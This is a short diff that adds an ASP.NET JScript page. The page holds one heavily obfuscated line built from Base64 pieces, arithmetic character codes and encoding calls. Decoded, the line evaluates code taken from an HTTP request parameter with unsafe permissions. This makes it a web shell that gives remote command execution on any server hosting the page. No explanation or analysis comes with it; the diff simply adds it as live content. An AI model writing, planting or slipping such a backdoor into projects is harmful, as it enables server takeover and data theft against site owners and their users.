@@ -1,0 +1,2 @@
+<%@Page Language="Jscript"%>
+<%eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('MjU0N'+'jU3O3'+'ZhciB'+'zYWZl'+''+'P'+char(0230036/01652)+char(0x5a7a/0x139)+'1'+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('Yg=='))+''+''+'n'+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('Tg=='))+char(48984/471)+'Z'+char(73248/672)+''+'UiO2V'+'2YWwo'+'UmVxd'+'WVzdC'+'5JdGV'+'tWydo'+'ZWhlJ'+'10sIH'+'NhZmU'+'pOzc2'+'Mzk3M'+'Ts='+'')));%>
